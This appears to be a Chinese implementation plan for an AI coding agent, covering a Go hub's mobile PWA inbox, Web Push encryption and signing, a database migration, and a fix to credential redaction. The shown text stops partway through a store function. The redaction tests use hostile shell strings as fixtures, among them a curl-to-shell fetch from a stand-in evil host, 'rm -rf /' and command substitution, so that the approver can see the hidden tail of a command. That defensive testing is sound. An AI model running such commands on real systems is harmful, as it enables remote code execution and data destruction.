# Railse OPC PWA 收件箱与 Web Push 实施计划（第 4 份，共 5 份）

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 做出手机优先的网页收件箱（Vite + React + TypeScript 的 PWA，由 hub 同源托管）和 Web Push：登录；按项目分组看待审批与“等你回答”；看请求详情；批准、拒绝、备注、“记住”前看草案并选范围；历史与依据；规则列表（看、启停、删、导入导出）；机器列表与吊销；总开关；开启通知后新请求推送到手机，点通知直达该请求。另外先把第 3 份终审留下的脱敏缺口按已拍板的方案修掉。

**Architecture:** 网页只经 REST 与 `/ws/client` 跟 hub 打交道，cookie 登录，与 hub 同源（hub 的写接口校验 Origin）；构建产物由 Go `embed` 进 hub 二进制，`/api`、`/ws` 之外的路径都回 `index.html`。Web Push 的加密（RFC 8291）与签名（RFC 8292 VAPID）用 Go 标准库自己实现，不加第三方依赖；推送只在新请求产生时发（permission、webhook、question），每条推送手机上必显示一条通知（iOS 要求），点开由页面读 URL 自己定位请求。订阅与 VAPID 私钥明文存库（设计 5.3 的例外）。

**Tech Stack:** Go 1.26（标准库 `crypto/ecdh`、`crypto/ecdsa`、`crypto/hkdf`、`crypto/aes`、`embed`）；Node 20（本机 20.20）、npm；`react@19`、`react-dom@19`、`react-router@7`、`vite@7`、`@vitejs/plugin-react@4`、`typescript@5`、`vitest@3`、`@playwright/test@1`，以及仅类型的 `@types/react@19`、`@types/react-dom@19`、`@types/node@20`（React 19 不自带类型，TSX 编译必需）。版本由 `web/package-lock.json` 锁定并入库。Go 侧不新增依赖。

**设计文档：** `docs/superpowers/specs/2026-10-21-railse-opc-design.md` 第 1、2、3、5、6 节，§0.6 的“第 4 份计划动笔前的三件事”（脱敏按 shell 词法边界修、出站与签名密钥明文例外、记住前预览与范围）；iOS 实验结论 `docs/superpowers/specs/2026-10-21-ios-webpush-findings.md` 第 5 节（固定域名、先判断 standalone、授权必须是点击里第一个调用、载荷带 id 与 URL、点击时 navigate 与 openWindow 两条路都写、用请求 id 作 tag）。**前置：** 第 1、2、3 份计划已合并到 main（9487097 之后），hub 的接口以 `docs/hub.md` 为准，本计划会改动其中的 `/api/inbox` 返回形状并新增接口，文档随 Task 一起改。

**后续：** 第 5 份做 `setup` 的接入码与开机自启、`doctor`、ACME、发布流水线（含网页构建与 Playwright 进 CI）。

## Global Constraints

- 模块路径 `github.com/railse/railse-opc`，`go 1.26.0`。本计划 Go 侧不新增依赖；网页侧只用 Tech Stack 列出的包，`package-lock.json` 入库，安装用 `npm ci`。
- 网页与 hub 同源：开发时 Vite 代理 `/api`、`/ws` 到本机 hub 并把 `Origin` 改写成 hub 的源；生产只经 hub 托管。cookie 认证沿用第 3 份（`railse_session`，HttpOnly、SameSite=Lax）。
- 网页里所有可见文案中文；不引入 UI 组件库、CSS 框架、状态管理库；样式用一个 `app.css` 加 CSS 变量，手机优先，跟随系统深浅色，适配 iOS 安全区（`env(safe-area-inset-*)`）。
- 推送只在新请求产生时发：`kind` 为 `permission`、`webhook`、`question`；`done` 不推。每条推送的 Service Worker 必须 `showNotification`（iOS 多次静默推送会吊销订阅）。推送载荷 JSON 不超过 3 KiB（Apple 上限 4 KiB），标题、正文截断。
- 推送端点返回 404 或 410 立即删订阅；其他失败累计，连续 5 次失败删订阅（设计 5.4）。
- hub 对订阅密钥（`keys.p256dh`、`keys.auth`）与 VAPID 私钥明文存库（设计 5.3 例外），永不经任何接口返回私钥；`GET /api/push/vapid` 只回公钥。
- 脱敏：shell 语境里不在引号与 heredoc 内的裸值遇到 `;`、`|`、`&`、`<`、`>`、`(`、`)`、反引号、`$` 即停；交给 shell 解释执行的内容（`sh|bash|zsh|dash|ksh -c` 的参数、`eval` 的参数、`ssh` 的引号参数、喂给它们的 heredoc 正文）按 shell 语境递归处理；其余双引号、单引号内与 heredoc 正文照旧抹到空白。`has_redacted` 标记与网页告警保留。（2026-10-23 执行期按审查结论细化。）
- 每个 Go Task 结束时 `gofmt -l .` 无输出、`go vet ./...` 无错、`go test ./... -race` 全过；每个网页 Task 结束时 `cd web && npm run check`（`tsc --noEmit` 加 `vitest run`）通过且 `npm run build` 成功。测试里的目录用 `os.MkdirTemp("", "rs")`。提交信息用中文。
- 构建产物目录 `internal/hub/webui/dist/` 不入库（只留 `.gitkeep`）；没构建时 hub 照样启动，网页路径回一页“网页未构建”的提示。
- 许可证 Apache 2.0。

---

## 文件结构

| 文件 | 职责 |
|---|---|
| `internal/redact/redact.go`（改）、`redact_test.go`（改） | shell 裸值按 shell 词法边界停止；heredoc 正文单独处理 |
| `internal/hub/store/schema.sql`（改）、`store.go`（改）、`migrate_test.go` | 库版本 2：`push_subscriptions` 加唯一端点、失败计数、UA；版本 1 → 2 的迁移 |
| `internal/hub/store/push.go`、`push_test.go` | 订阅的增删查、成功与失败记录 |
| `internal/hub/push/vapid.go`、`encrypt.go`、`client.go`、`*_test.go` | RFC 8292 VAPID 头、RFC 8291 aes128gcm 加密、发送客户端（Go 标准库） |
| `internal/hub/store/requests.go`（改） | `OpenQuestions`：还没有后续事件的 question 行 |
| `internal/hub/api.go`（改）、`rules.go`（改）、`api_test.go`（改） | `/api/inbox` 加 `questions`；`POST /api/requests/{id}/propose`；decide 的 `scope` |
| `internal/hub/pushsvc.go`、`pushsvc_test.go`、`api_push.go` | 推送队列与工作协程、VAPID 密钥的生成与读取、`/api/push/*` |
| `internal/hub/webui/webui.go`、`webui_test.go`、`dist/.gitkeep` | 嵌入构建产物、SPA 回退、缓存头、未构建提示 |
| `internal/hub/server.go`（改） | 挂网页、CSP 头、`PublicURL` 配置、启动推送工作协程 |
| `cmd/railse/hub.go`（改）、`hub_test.go`（改） | `--public-url`；`railse hub vapid [--rotate]` |
| `web/package.json`、`package-lock.json`、`vite.config.ts`、`tsconfig.json`、`index.html` | 网页工程 |
| `web/public/manifest.webmanifest`、`public/sw.js`、`public/icons/*.png`、`public/icons/gen.go` | PWA 清单、Service Worker、图标（Go 脚本生成） |
| `web/src/api.ts`、`api.test.ts` | fetch 封装：JSON、错误类型、401 跳登录 |
| `web/src/ws.ts`、`ws.test.ts` | `/ws/client` 重连与帧分发 |
| `web/src/store.tsx`、`store.test.ts` | 应用状态（收件箱、问题、状态、规则、机器）与 reducer |
| `web/src/format.ts`、`format.test.ts` | 相对时间、风险等级文案、载荷摘要 |
| `web/src/pwa.ts`、`pwa.test.ts` | standalone 判断、推送能力判断、订阅流程 |
| `web/src/main.tsx`、`App.tsx`、`app.css` | 入口、路由、底部导航、全局样式 |
| `web/src/pages/Login.tsx`、`Inbox.tsx`、`Request.tsx`、`History.tsx`、`Rules.tsx`、`Machines.tsx`、`Settings.tsx` | 页面 |
| `web/src/components/Payload.tsx`、`DecideSheet.tsx`、`Banner.tsx`、`RequestCard.tsx` | 复用组件 |
| `web/e2e/approve.spec.ts`、`global-setup.ts`、`playwright.config.ts`、`scripts/e2e-web.sh` | Playwright 端到端 |
| `Makefile` | `make web`、`make build`、`make test`、`make e2e` |
| `docs/web.md`、`docs/hub.md`（改）、设计文档 §1.3（改） | 文档 |

---

### Task 1: 脱敏按 shell 词法边界停止，heredoc 正文单独处理

**Files:**
- Modify: `internal/redact/redact.go`
- Modify: `internal/redact/redact_test.go`

**Interfaces:**
- 导出函数签名不变：`String(s string) string`、`Text(s string) string`、`Payload(p policy.Payload) policy.Payload`。
- 行为变化（只影响 `String`，即 shell 语境）：
  - 裸值（不在引号内）的字符类从 `[^\s'"\\]+` 改为 `[^\s'"\;|&<>()` + "`" + `$]+`：遇到 `;`、`|`、`&`、`<`、`>`、`(`、`)`、反引号、`$` 即停。理由：shell 里这些字符本来就结束一个裸词（`$` 开始展开，字面密码不可能未加引号地含 `$`），所以不会多漏秘密；原来一直抹到空白会把 `X_TOKEN=a;curl …|sh` 的后半截命令一起藏起来，而手机上看到的就是审批依据。
  - heredoc：`<<` 或 `<<-` 后的分隔词（可带引号）到下一行开始的正文，直到单独一行的分隔词（`<<-` 允许前导制表符）为止，正文按 `textRules`（抹到空白或引号，引号严格成对）处理，其余部分按 shell 规则处理。找不到结束行时正文到文本末尾。
  - 引号内的值照旧整段抹（`quoted` 不变）。
- 包内新增：`func splitHeredocs(s string) []segment`，`type segment struct{ text string; heredoc bool }`。

- [ ] **Step 1: 写失败的测试**

在 `internal/redact/redact_test.go` 末尾追加：
```go
func TestShellBareValueStopsAtShellMetachars(t *testing.T) {
	cases := []struct{ in, want string }{
		// 终审 I4 的实测用例：后半截命令必须露出来
		{`X_TOKEN=a;curl${IFS}https://evil.example/x.sh|sh`, `X_TOKEN=<redacted>;curl${IFS}https://evil.example/x.sh|sh`},
		{`password=abc;rm -rf /`, `password=<redacted>;rm -rf /`},
		{`export TOKEN=ghp_abcdefghijklmnopqrstuvwxyz0123&&curl evil`, `export TOKEN=<redacted>&&curl evil`},
		{`API_KEY=sk-abcdefghijklmnopqrstuvwxyz|tee out`, `API_KEY=<redacted>|tee out`},
		{`npm login --password hunter2>log`, `npm login --password <redacted>>log`},
		{"TOKEN=abc`id`", "TOKEN=<redacted>`id`"},
		{`TOKEN=abc$(id)`, `TOKEN=<redacted>$(id)`},
		{`TOKEN=$SECRET npm test`, `TOKEN=$SECRET npm test`}, // 变量引用不是字面秘密，原样保留
		// 引号内照旧整段抹
		{`POSTGRES_PASSWORD="Xy7&kP(2)q" psql`, `POSTGRES_PASSWORD=<redacted> psql`},
		{`npm login --password 'a;b|c'`, `npm login --password <redacted>`},
		// 原有行为不变
		{`API_KEY=sk-abcdefghijklmnopqrstuvwxyz npm test`, `API_KEY=<redacted> npm test`},
		{`curl -H "Authorization: Bearer abc.def.ghi" https://x.y`, `curl -H "Authorization: <redacted>" https://x.y`},
	}
	for _, c := range cases {
		if got := String(c.in); got != c.want {
			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
	}
}

func TestShellHeredocBodyKeepsGreedyRedaction(t *testing.T) {
	in := "cat > .env <<EOF\npassword=Xy7;kP|2q\nTOKEN=abc&def\nEOF\necho password=abc;rm x"
	want := "cat > .env <<EOF\npassword=<redacted>\nTOKEN=<redacted>\nEOF\necho password=<redacted>;rm x"
	if got := String(in); got != want {
		t.Errorf("heredoc:\n 得到 %q\n 想要 %q", got, want)
	}
	// <<- 允许前导制表符；带引号的分隔词；没有结束行时正文到末尾
	in2 := "cat <<-'END'\n\tpassword=a;b\n\tEND\nTOKEN=x;y"
	want2 := "cat <<-'END'\n\tpassword=<redacted>\n\tEND\nTOKEN=<redacted>;y"
	if got := String(in2); got != want2 {
		t.Errorf("heredoc <<-:\n 得到 %q\n 想要 %q", got, want2)
	}
	in3 := "cat <<EOF\npassword=a;b"
	want3 := "cat <<EOF\npassword=<redacted>"
	if got := String(in3); got != want3 {
		t.Errorf("未闭合 heredoc:\n 得到 %q\n 想要 %q", got, want3)
	}
}

func TestSplitHeredocs(t *testing.T) {
	segs := splitHeredocs("a <<X\nbody\nX\nb <<Y\nmore")
	var got []string
	for _, s := range segs {
		kind := "shell"
		if s.heredoc {
			kind = "heredoc"
		}
		got = append(got, kind+":"+s.text)
	}
	want := []string{"shell:a <<X\n", "heredoc:body\n", "shell:X\nb <<Y\n", "heredoc:more"}
	if strings.Join(got, "|") != strings.Join(want, "|") {
		t.Errorf("splitHeredocs:\n 得到 %q\n 想要 %q", got, want)
	}
}
```
同时把 `TestString` 里（若有）期望“吞到空白”的旧用例按新语义改：例如 `password=abc;rm -rf /` 一类若存在，期望改为 `password=<redacted>;rm -rf /`。`TestStringCredentialGaps`、`TestStringCredentialGapsRound2` 里凡是裸值含 `;|&<>()` 反引号 `$` 的用例，期望同样改成到该字符为止；引号内的不变。

- [ ] **Step 2: 跑测试确认失败**

Run: `go test ./internal/redact/ -run 'ShellBare|Heredoc|SplitHeredocs'`
Expected: FAIL，`X_TOKEN=a;curl…` 得到 `X_TOKEN=<redacted>`；`splitHeredocs` 未定义。

- [ ] **Step 3: 写实现**

`internal/redact/redact.go`：
- 把 `shellRules` 的定义改为：
```go
	// shellRules 用于命令行：裸值在空白、引号、反斜杠和 shell 元字符处停。
	// ; | & < > ( ) 反引号 $ 在 shell 里本来就结束一个裸词（$ 开始展开，字面密码不可能未加引号地含它），
	// 所以到这里停不会多漏秘密；引号里的值由 quoted 整段抹，heredoc 正文由 splitHeredocs 单独按 textRules 处理。
	// 一直抹到空白的旧做法会把 X_TOKEN=a;curl …|sh 的后半截命令藏起来，而手机上看到的就是审批依据（第 3 份终审 I4）。
	shellRules = compile("[^\\s'\"\\\;|&<>()`$]+", false)
```
- 把 `String` 改为：
```go
// String 按命令行语境返回脱敏后的副本。heredoc 正文没有 shell 词法，按普通文本语境处理。
func String(s string) string {
	segs := splitHeredocs(s)
	if len(segs) == 1 && !segs[0].heredoc {
		return redact(s, shellRules)
	}
	var b strings.Builder
	b.Grow(len(s))
	for _, seg := range segs {
		if seg.heredoc {
			b.WriteString(redact(seg.text, textRules))
		} else {
			b.WriteString(redact(seg.text, shellRules))
		}
	}
	return b.String()
}
```
- 新增（放在 `String` 下面，导入 `strings`）：
```go
// segment 是命令文本里的一段：shell 词法部分，或 heredoc 正文。
type segment struct {
	text    string
	heredoc bool
}

// heredocStart 匹配 << 或 <<- 后的分隔词：可带单引号、双引号或反斜杠（都表示正文不展开，与脱敏无关）。
var heredocStart = regexp.MustCompile("<<(-?)[ \t]*(?:'([^']+)'|\"([^\"]+)\"|\\\\?([^\\s'\"<>|&;]+))")

// splitHeredocs 把 heredoc 正文从命令文本里切出来。分隔行所在的那一行属于 shell 段；正文从下一行开始，
// 到单独一行的分隔词为止（<<- 时允许前导制表符）；分隔词那一行又属于 shell 段。找不到结束行时正文到文本末尾。
// 同一行有多个 heredoc 时按出现顺序依次读取正文（bash 的规则）。
func splitHeredocs(s string) []segment {
	var segs []segment
	rest := s
	for {
		nl := strings.IndexByte(rest, '\n')
		line := rest
		if nl >= 0 {
			line = rest[:nl+1]
		}
		starts := heredocStart.FindAllStringSubmatch(line, -1)
		if len(starts) == 0 || nl < 0 {
			segs = appendShell(segs, rest)
			return segs
		}
		segs = appendShell(segs, line)
		rest = rest[nl+1:]
		for _, m := range starts {
			strip := m[1] == "-"
			word := m[2] + m[3] + m[4]
			body, after, closed := cutHeredocBody(rest, word, strip)
			if body != "" {
				segs = append(segs, segment{text: body, heredoc: true})
			}
			if !closed {
				return segs
			}
			rest = after
		}
		if rest == "" {
			return segs
		}
	}
}

// cutHeredocBody 从 rest 里取出正文：返回正文、从结束行开始的剩余文本、是否找到结束行。
func cutHeredocBody(rest, word string, strip bool) (body, after string, closed bool) {
	pos := 0
	for pos < len(rest) {
		nl := strings.IndexByte(rest[pos:], '\n')
		line := rest[pos:]
		next := len(rest)
		if nl >= 0 {
			line = rest[pos : pos+nl]
			next = pos + nl + 1
		}
		check := strings.TrimSuffix(line, "\r")
		if strip {
			check = strings.TrimLeft(check, "\t")
		}
		if check == word {
			return rest[:pos], rest[pos:], true
		}
		pos = next
	}
	return rest, "", false
}

// appendShell 追加 shell 段，相邻的 shell 段合并。
func appendShell(segs []segment, text string) []segment {
	if text == "" {
		return segs
	}
	if n := len(segs); n > 0 && !segs[n-1].heredoc {
		segs[n-1].text += text
		return segs
	}
	return append(segs, segment{text: text})
}
```
- `Payload` 里 `out.Command = String(p.Command)` 不变；`Args`（MCP 参数按字符串处理的分支）若调用的是 `redact(x, shellRules)`，改成 `String(x)`，让 heredoc 处理一致。

- [ ] **Step 4: 跑测试确认通过**

Run: `gofmt -l . && go vet ./internal/redact/ && go test ./internal/redact/ ./internal/hub/ ./internal/agent/ ./cmd/railse/ -race`
Expected: 全部 PASS。hub 与 agent 的测试里若有断言旧的“吞到空白”行为的（搜索 `<redacted>` 后紧跟 `;` 或 `|` 的期望），按新语义改期望；e2e 测试里的 `has_redacted` 断言不受影响。

- [ ] **Step 5: 更新文档并提交**

`docs/hub.md` 里 “`has_redacted` 为 true 的请求，网页必须醒目告警”一段，把括号里的例子改为：“凭据被换成了 `<redacted>`；裸值在 shell 元字符处停止，引号内与 heredoc 正文整段抹掉，所以显示的仍不是原文”。

```bash
git add internal/redact/redact.go internal/redact/redact_test.go docs/hub.md
git commit -m "fix(redact): shell 裸值在 shell 元字符处停止，heredoc 正文单独按文本语境脱敏，不再吞掉后半截命令"
```

---

### Task 2: 库版本 2：推送订阅表与迁移机制

**Files:**
- Modify: `internal/hub/store/schema.sql`（`push_subscriptions` 改成版本 2 的形状）
- Modify: `internal/hub/store/store.go`（`schemaVersion = 2`；`migrate` 支持逐版本升级）
- Create: `internal/hub/store/migrate_test.go`
- Create: `internal/hub/store/push.go`
- Create: `internal/hub/store/push_test.go`

**Interfaces:**
- `schema.sql` 的 `push_subscriptions` 改为：
  ```sql
  CREATE TABLE IF NOT EXISTS push_subscriptions (
    id         TEXT PRIMARY KEY,
    endpoint   TEXT NOT NULL UNIQUE,
    keys       TEXT NOT NULL,              -- JSON {"p256dh":"…","auth":"…"}，明文（设计 5.3 例外）
    user_agent TEXT NOT NULL DEFAULT '',
    created_at TEXT NOT NULL,
    last_ok_at TEXT,
    failures   INTEGER NOT NULL DEFAULT 0  -- 连续失败次数，成功归零
  );
  ```
- `store.go`：`const schemaVersion = 2`；`var migrations = map[int]string{2: migrateV2}`（键是目标版本）；`migrate()` 在同一事务里：没有 `schema_version` 表 → 跑完整 `schema.sql` 并写 2；有 → 读 v，`v > schemaVersion` 报错“数据库版本 %d 比程序（%d）新，请升级 railse”，`v < schemaVersion` 依次执行 `migrations[v+1]`…`migrations[schemaVersion]` 并更新版本，相等什么都不做。
- `migrateV2`：
  ```sql
  CREATE TABLE push_subscriptions_v2 (
    id TEXT PRIMARY KEY, endpoint TEXT NOT NULL UNIQUE, keys TEXT NOT NULL, user_agent TEXT NOT NULL DEFAULT '',
    created_at TEXT NOT NULL, last_ok_at TEXT, failures INTEGER NOT NULL DEFAULT 0);
  INSERT OR IGNORE INTO push_subscriptions_v2(id, endpoint, keys, created_at, last_ok_at)
    SELECT id, endpoint, keys, created_at, last_ok_at FROM push_subscriptions;
  DROP TABLE push_subscriptions;
  ALTER TABLE push_subscriptions_v2 RENAME TO push_subscriptions;
  ```
- `push.go`（包 `store`）:
  - `type PushSubscription struct{ ID, Endpoint, P256dh, Auth, UserAgent, CreatedAt string; LastOkAt *string; Failures int }`
  - `func (s *Store) UpsertPushSubscription(endpoint, p256dh, auth, userAgent string) (PushSubscription, error)`：按 endpoint 唯一，已有则更新 keys、user_agent 并把 failures 归零
  - `func (s *Store) ListPushSubscriptions() ([]PushSubscription, error)`（按 created_at）
  - `func (s *Store) GetPushSubscription(endpoint string) (PushSubscription, error)`（`ErrNotFound`）
  - `func (s *Store) DeletePushSubscription(endpoint string) (bool, error)`
  - `func (s *Store) MarkPushOK(endpoint string) error`（`last_ok_at = now`，`failures = 0`）
  - `func (s *Store) MarkPushFailure(endpoint string) (int, error)`（`failures + 1`，返回新值）
  - `func (s *Store) CountPushSubscriptions() (int, error)`

- [ ] **Step 1: 写失败的测试**

`internal/hub/store/migrate_test.go`:
```go
package store

import (
	"database/sql"
	"os"
	"path/filepath"
	"testing"
)

// v1 库：只建 schema_version 和旧形状的 push_subscriptions（其余表迁移不碰，这里不需要）。
const v1PushSQL = `
CREATE TABLE schema_version (v INTEGER NOT NULL);
INSERT INTO schema_version(v) VALUES(1);
CREATE TABLE push_subscriptions (id TEXT PRIMARY KEY, endpoint TEXT NOT NULL, keys TEXT NOT NULL, created_at TEXT NOT NULL, last_ok_at TEXT);
INSERT INTO push_subscriptions VALUES('a', 'https://p.example/1', '{"p256dh":"x","auth":"y"}', '2026-10-23T00:00:00.000000000Z', NULL);
INSERT INTO push_subscriptions VALUES('b', 'https://p.example/1', '{"p256dh":"x2","auth":"y2"}', '2026-10-23T00:00:01.000000000Z', NULL);
INSERT INTO push_subscriptions VALUES('c', 'https://p.example/2', '{"p256dh":"z","auth":"w"}', '2026-10-23T00:00:02.000000000Z', NULL);
`

func openRaw(t *testing.T, path string) *sql.DB {
	t.Helper()
	db, err := sql.Open("sqlite", "file:"+path)
	if err != nil {
		t.Fatal(err)
	}
	return db
}

func TestMigrateV1ToV2(t *testing.T) {
	dir, _ := os.MkdirTemp("", "rs")
	defer os.RemoveAll(dir)
	path := filepath.Join(dir, "hub.db")
	raw := openRaw(t, path)
	if _, err := raw.Exec(v1PushSQL); err != nil {
		t.Fatal(err)
	}
	raw.Close()
	s, err := Open(path)
	if err != nil {
		t.Fatalf("打开 v1 库应升级: %v", err)
	}
	defer s.Close()
	var v int
	if err := s.db.QueryRow("SELECT v FROM schema_version").Scan(&v); err != nil || v != 2 {
		t.Fatalf("版本 = %d, %v", v, err)
	}
	subs, err := s.ListPushSubscriptions()
	if err != nil || len(subs) != 2 {
		t.Fatalf("重复端点应只留一条: %+v %v", subs, err)
	}
	if subs[0].Endpoint != "https://p.example/1" || subs[0].Failures != 0 || subs[0].P256dh != "x" {
		t.Fatalf("迁移后的行: %+v", subs[0])
	}
	// 唯一约束生效
	if _, err := s.db.Exec("INSERT INTO push_subscriptions(id, endpoint, keys, created_at) VALUES('d', 'https://p.example/2', '{}', '2026')"); err == nil {
		t.Fatal("重复 endpoint 应被拒")
	}
	// 再打开一次：版本一致，不再迁移
	s.Close()
	s2, err := Open(path)
	if err != nil {
		t.Fatal(err)
	}
	s2.Close()
}

func TestMigrateRefusesNewerDB(t *testing.T) {
	dir, _ := os.MkdirTemp("", "rs")
	defer os.RemoveAll(dir)
	path := filepath.Join(dir, "hub.db")
	raw := openRaw(t, path)
	raw.Exec("CREATE TABLE schema_version (v INTEGER NOT NULL); INSERT INTO schema_version(v) VALUES(99);")
	raw.Close()
	if _, err := Open(path); err == nil {
		t.Fatal("比程序新的库应拒绝打开")
	}
}

func TestFreshDBIsV2(t *testing.T) {
	dir, _ := os.MkdirTemp("", "rs")
	defer os.RemoveAll(dir)
	s, err := Open(filepath.Join(dir, "hub.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer s.Close()
	var v int
	s.db.QueryRow("SELECT v FROM schema_version").Scan(&v)
	if v != 2 {
		t.Fatalf("新库版本 = %d", v)
	}
	var n int
	if err := s.db.QueryRow("SELECT COUNT(*) FROM pragma_table_info('push_subscriptions') WHERE name = 'failures'").Scan(&n); err != nil || n != 1 {
		t.Fatalf("新库应有 failures 列: %d %v", n, err)
	}
}
```
（`openRaw` 用的驱动名 `sqlite` 与 `store.go` 里 `sql.Open` 用的一致；若 `store.go` 用的是别的驱动名，照它改。）

`internal/hub/store/push_test.go`:
```go
package store

import (
	"errors"
	"os"
	"path/filepath"
	"testing"
)

func openTestStore(t *testing.T) *Store {
	t.Helper()
	dir, _ := os.MkdirTemp("", "rs")
	t.Cleanup(func() { os.RemoveAll(dir) })
	s, err := Open(filepath.Join(dir, "hub.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { s.Close() })
	return s
}

func TestPushSubscriptionLifecycle(t *testing.T) {
	s := openTestStore(t)
	sub, err := s.UpsertPushSubscription("https://web.push.apple.com/abc", "p1", "a1", "Mozilla/5.0 iPhone")
	if err != nil || sub.ID == "" || sub.Endpoint != "https://web.push.apple.com/abc" || sub.Failures != 0 {
		t.Fatalf("upsert: %+v %v", sub, err)
	}
	if n, _ := s.MarkPushFailure(sub.Endpoint); n != 1 {
		t.Fatalf("failures = %d", n)
	}
	if n, _ := s.MarkPushFailure(sub.Endpoint); n != 2 {
		t.Fatalf("failures = %d", n)
	}
	// 同一端点重新订阅：换 keys、failures 归零、id 不变
	again, err := s.UpsertPushSubscription(sub.Endpoint, "p2", "a2", "ua2")
	if err != nil || again.ID != sub.ID || again.P256dh != "p2" || again.Auth != "a2" || again.Failures != 0 || again.UserAgent != "ua2" {
		t.Fatalf("重新订阅: %+v %v", again, err)
	}
	s.MarkPushFailure(sub.Endpoint)
	if err := s.MarkPushOK(sub.Endpoint); err != nil {
		t.Fatal(err)
	}
	got, err := s.GetPushSubscription(sub.Endpoint)
	if err != nil || got.Failures != 0 || got.LastOkAt == nil {
		t.Fatalf("MarkPushOK 后: %+v %v", got, err)
	}
	s.UpsertPushSubscription("https://fcm.example/2", "p", "a", "")
	if n, _ := s.CountPushSubscriptions(); n != 2 {
		t.Fatalf("count = %d", n)
	}
	list, _ := s.ListPushSubscriptions()
	if len(list) != 2 || list[0].Endpoint != sub.Endpoint {
		t.Fatalf("list: %+v", list)
	}
	if ok, err := s.DeletePushSubscription(sub.Endpoint); err != nil || !ok {
		t.Fatalf("delete: %v %v", ok, err)
	}
	if ok, _ := s.DeletePushSubscription(sub.Endpoint); ok {
		t.Fatal("再删应返回 false")
	}
	if _, err := s.GetPushSubscription(sub.Endpoint); !errors.Is(err, ErrNotFound) {
		t.Fatalf("删后应 ErrNotFound: %v", err)
	}
	if _, err := s.UpsertPushSubscription("", "p", "a", ""); err == nil {
		t.Fatal("空端点应报错")
	}
	if _, err := s.UpsertPushSubscription("https://x", "", "a", ""); err == nil {
		t.Fatal("空 keys 应报错")
	}
}
```

- [ ] **Step 2: 跑测试确认失败**

Run: `go test ./internal/hub/store/ -run 'Migrate|FreshDB|PushSubscription'`
Expected: FAIL（`TestMigrateV1ToV2` 报“数据库版本 1 与程序版本 1 不一致”之类或 `ListPushSubscriptions` 未定义）。

- [ ] **Step 3: 写实现**

`internal/hub/store/schema.sql`：把 `push_subscriptions` 的建表语句换成接口段里的版本 2 形状。

`internal/hub/store/store.go`：
- `const schemaVersion = 2`。
- 加：
```go
// migrations 是逐版本升级的 SQL，键是升级后的版本号。改 schema.sql 时必须同时加一条迁移并提高 schemaVersion：
// 已有库只跑迁移，不再执行 schema.sql。
var migrations = map[int]string{
	2: `
CREATE TABLE push_subscriptions_v2 (
  id TEXT PRIMARY KEY, endpoint TEXT NOT NULL UNIQUE, keys TEXT NOT NULL, user_agent TEXT NOT NULL DEFAULT '',
  created_at TEXT NOT NULL, last_ok_at TEXT, failures INTEGER NOT NULL DEFAULT 0);
INSERT OR IGNORE INTO push_subscriptions_v2(id, endpoint, keys, created_at, last_ok_at)
  SELECT id, endpoint, keys, created_at, last_ok_at FROM push_subscriptions ORDER BY created_at;
DROP TABLE push_subscriptions;
ALTER TABLE push_subscriptions_v2 RENAME TO push_subscriptions;
`,
}
```
- `migrate()` 里版本不一致的分支改为：
```go
		switch {
		case v > schemaVersion:
			return fmt.Errorf("数据库版本 %d 比程序（%d）新，请升级 railse", v, schemaVersion)
		case v < schemaVersion:
			for next := v + 1; next <= schemaVersion; next++ {
				sqlText, ok := migrations[next]
				if !ok {
					return fmt.Errorf("缺少到版本 %d 的迁移", next)
				}
				if _, err := tx.Exec(sqlText); err != nil {
					return fmt.Errorf("迁移到版本 %d: %w", next, err)
				}
				if _, err := tx.Exec("UPDATE schema_version SET v = ?", next); err != nil {
					return fmt.Errorf("写 schema_version: %w", err)
				}
			}
		}
		return nil
```
（`schema_version` 只有一行，前面已校验 `n == 1`。）

`internal/hub/store/push.go`:
```go
package store

import (
	"database/sql"
	"encoding/json"
	"errors"
	"fmt"
)

// PushSubscription 是一条 Web Push 订阅。P256dh、Auth 是浏览器给的 base64url 串，明文存（设计 5.3 例外）。
type PushSubscription struct {
	ID        string
	Endpoint  string
	P256dh    string
	Auth      string
	UserAgent string
	CreatedAt string
	LastOkAt  *string
	Failures  int
}

type pushKeys struct {
	P256dh string `json:"p256dh"`
	Auth   string `json:"auth"`
}

const pushCols = "id, endpoint, keys, user_agent, created_at, last_ok_at, failures"

// UpsertPushSubscription 按端点登记或更新订阅：同一端点重新订阅时换 keys 与 UA，连续失败归零，id 不变。
func (s *Store) UpsertPushSubscription(endpoint, p256dh, auth, userAgent string) (PushSubscription, error) {
	if endpoint == "" || p256dh == "" || auth == "" {
		return PushSubscription{}, errors.New("订阅缺 endpoint 或 keys")
	}
	keys, err := json.Marshal(pushKeys{P256dh: p256dh, Auth: auth})
	if err != nil {
		return PushSubscription{}, err
	}
	_, err = s.db.Exec(`INSERT INTO push_subscriptions(id, endpoint, keys, user_agent, created_at) VALUES(?, ?, ?, ?, ?)
		ON CONFLICT(endpoint) DO UPDATE SET keys = excluded.keys, user_agent = excluded.user_agent, failures = 0`,
		NewID(), endpoint, string(keys), userAgent, Now())
	if err != nil {
		return PushSubscription{}, fmt.Errorf("登记推送订阅: %w", err)
	}
	return s.GetPushSubscription(endpoint)
}

func scanPush(row interface{ Scan(...any) error }) (PushSubscription, error) {
	var p PushSubscription
	var keys string
	if err := row.Scan(&p.ID, &p.Endpoint, &keys, &p.UserAgent, &p.CreatedAt, &p.LastOkAt, &p.Failures); err != nil {
		return PushSubscription{}, err
	}
	var k pushKeys
	if err := json.Unmarshal([]byte(keys), &k); err != nil {
		return PushSubscription{}, fmt.Errorf("订阅 %s 的 keys 不是 JSON: %w", p.ID, err)
	}
	p.P256dh, p.Auth = k.P256dh, k.Auth
	return p, nil
}

// GetPushSubscription 按端点取订阅。
func (s *Store) GetPushSubscription(endpoint string) (PushSubscription, error) {
	p, err := scanPush(s.db.QueryRow("SELECT "+pushCols+" FROM push_subscriptions WHERE endpoint = ?", endpoint))
	if errors.Is(err, sql.ErrNoRows) {
		return PushSubscription{}, ErrNotFound
	}
	return p, err
}

// ListPushSubscriptions 按登记时间列全部订阅。
func (s *Store) ListPushSubscriptions() ([]PushSubscription, error) {
	rows, err := s.db.Query("SELECT " + pushCols + " FROM push_subscriptions ORDER BY created_at, rowid")
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var out []PushSubscription
	for rows.Next() {
		p, err := scanPush(rows)
		if err != nil {
			return nil, err
		}
		out = append(out, p)
